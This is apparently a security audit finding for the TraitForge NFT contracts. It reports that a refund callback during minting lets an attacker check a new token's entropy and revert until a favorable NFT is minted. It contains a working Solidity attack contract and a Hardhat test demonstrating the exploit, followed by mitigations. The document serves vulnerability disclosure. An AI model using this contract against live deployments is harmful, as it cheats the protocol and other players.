# Vulnerability details

# Attacker can manipulate game to always receive a favorable NFT with favorable factors


## Impact
Malicious users can gain unfair advantage to the game economy and only pay for favorable NFTs with favorable factors, rendering game entropy useless.


## Proof of Concept

The game economy is built on the entropy which assures that game players get random results when forging or minting NFTs. This vulnerability allows an attacker to only pay for NFTs with factors favored by the attacker. 
* The Mint function on the TraitForgeNFT contract allows for a user to send a payment amount more than what is required by the protocol for minting. In that case, the protocol will send the extra eth back.  

* If the sender is a smart contract, the eth sent by the protocol will trigger the receive function on the malicious contract.
* Attack Scenario:
    * Attacker deploys a malicious contract with the receive function implemented. 
    * The malicious contract uses the calculateMintPrice to get the mint price details. 
    https://github.com/code-423n4/2024-07-traitforge/blob/279b2887e3d38bc219a05d332cbcb0655b2dc644/contracts/TraitForgeNft/TraitForgeNft.sol#L227
    * The malicious contract adds more eth to the mint price
    * The malicious contract calls the mintToken function on TraitForgeNFT
    https://github.com/code-423n4/2024-07-traitforge/blob/279b2887e3d38bc219a05d332cbcb0655b2dc644/contracts/TraitForgeNft/TraitForgeNft.sol#L181
    * TraitForgeNFT sends the extra eth back to the malicious contract which triggers the receive() function
    * The malicious contract calls the getTokenEntropy function on TraitForgeNFT and checks if it meets their requirement. If it does not, the contract can revert the transaction.
    * Attacker repeats the process until they can find a favorable entropy (for example golden nft 99999)

Malicious Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TraitForgeNft/ITraitForgeNft.sol";

contract MaliciousContract{
    ITraitForgeNft nftContract;
    constructor(address _forgeNFTaddress){
        nftContract = ITraitForgeNft(_forgeNFTaddress);
    }
    function exploit(bytes32[] calldata proof) public payable{
        //get mint price
        uint256 mintPrice = nftContract.calculateMintPrice();

        //add some wei to the mint price to always trigger a call back to our contract for refunds
        uint256 new_mint_price = mintPrice+2000;

        //call the mint function
        nftContract.mintToken{value:new_mint_price}(proof);
    }

    receive() external payable{
        // we only care about processing messages from the nft contract
        if (msg.sender!=address(nftContract))
            return;

        //get latest nft owned by our contract
        //we are getting it this way since there is no onerc721received hook as the contract uses mint vs safemint
        uint256 balance = nftContract.balanceOf(address(this));
        uint256 latestTokenId = nftContract.tokenOfOwnerByIndex(address(this), balance - 1);

        //Here we can add any logic to validate whether this is a favorable NFT
        //As an example, we will check if the NFT is the golden one 99999, we can check for NFT with any factors we prefer. 
        uint256 preferredEntropy = 99999;
        uint256 tokenEntropy = nftContract.getTokenEntropy(latestTokenId);

        //revert the transaction if the entropy is not what we are looking for
        require(preferredEntropy==tokenEntropy);

    }
}
```

```Javascript
import {
  Airdrop,
  DevFund,
  EntityForging,
  EntropyGenerator,
  EntityTrading,
  NukeFund,
  TraitForgeNft,
} from '../typechain-types';
import { HardhatEthersSigner } from '@nomicfoundation/hardhat-ethers/signers';
import generateMerkleTree from '../scripts/genMerkleTreeLib';
import { fastForward } from '../utils/evm';

const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('TraitForgeNFT', () => {
  let entityForging: EntityForging;
  let nft: TraitForgeNft;
  let owner: HardhatEthersSigner;
  let user1: HardhatEthersSigner;
  let user2: HardhatEthersSigner;
  let entityTrading: EntityTrading;
  let nukeFund: NukeFund;
  let devFund: DevFund;
  let merkleInfo: any;
  let maliciousContractInstance: MaliciousContract;

  before(async () => {
    [owner, user1, user2] = await ethers.getSigners();

    // Deploy TraitForgeNft contract
    const TraitForgeNft = await ethers.getContractFactory('TraitForgeNft');
    nft = (await TraitForgeNft.deploy()) as TraitForgeNft;

    // Deploy Airdrop contract
    const airdropFactory = await ethers.getContractFactory('Airdrop');
    const airdrop = (await airdropFactory.deploy()) as Airdrop;

    await nft.setAirdropContract(await airdrop.getAddress());

    await airdrop.transferOwnership(await nft.getAddress());

    // Deploy EntityForging contract
    const EntropyGenerator = await ethers.getContractFactory(
      'EntropyGenerator'
    );
    const entropyGenerator = (await EntropyGenerator.deploy(
      await nft.getAddress()
    )) as EntropyGenerator;

    await entropyGenerator.writeEntropyBatch1();

    await nft.setEntropyGenerator(await entropyGenerator.getAddress());

    // Deploy EntityForging contract
    const EntityForging = await ethers.getContractFactory('EntityForging');
    entityForging = (await EntityForging.deploy(
      await nft.getAddress()
    )) as EntityForging;
    await nft.setEntityForgingContract(await entityForging.getAddress());

    devFund = await ethers.deployContract('DevFund');
    await devFund.waitForDeployment();

    const NukeFund = await ethers.getContractFactory('NukeFund');

    nukeFund = (await NukeFund.deploy(
      await nft.getAddress(),
      await airdrop.getAddress(),
      await devFund.getAddress(),
      owner.address
    )) as NukeFund;
    await nukeFund.waitForDeployment();

    await nft.setNukeFundContract(await nukeFund.getAddress());

    entityTrading = await ethers.deployContract('EntityTrading', [
      await nft.getAddress(),
    ]);

    // Set NukeFund address
    await entityTrading.setNukeFundAddress(await nukeFund.getAddress());

    merkleInfo = generateMerkleTree([
      owner.address,
      user1.address,
      user2.address,
    ]);

    await nft.setRootHash(merkleInfo.rootHash);

    const MaliciousContract = await ethers.getContractFactory("MaliciousContract");
    maliciousContractInstance = (await MaliciousContract.deploy(await nft.getAddress())) as MaliciousContract;
  });

  describe('MaliciousDeterministicMinting', () => {

    it('minting should fail if not the golden nft, else NFT balance should be more than 1 with token entropy as 99999',async()=>{
      fastForward(24 * 60 * 60 + 1);
      try{
        await maliciousContractInstance.connect(user1).exploit(merkleInfo.whitelist[0].proof,{value: ethers.parseEther('100')});
        let maliciousContractBalance = await expect(nft.balanceOf(maliciousContractInstance.getAddress())).to.be.gt(0);
        //this means the token was minted. In that case it must be the golden one. 
        const latestTokenId = await nft.tokenOfOwnerByIndex(await maliciousContractInstance.getAddress(), maliciousContractBalance - BigInt(1));
        await expect(nft.getTokenEntropy(latestTokenId)).to.be.equal(99999);
      }catch(error){
        //this means our smart contract reverted the transaction
        expect(error.message).to.include("Refund of excess payment failed.")
      }    
    });
  });
});
```

## Recommended Mitigation Steps

* There are a couple of different options
    * Check for the mint price and compare it to the msg.value when a user calls mintToken function. Revert the transaction if there is no match. 
    * Keep the eth inside the smart contract with internal accounting. Introduce an external withdraw function which can be called by the user. This mitigates triggering external smart contracts.
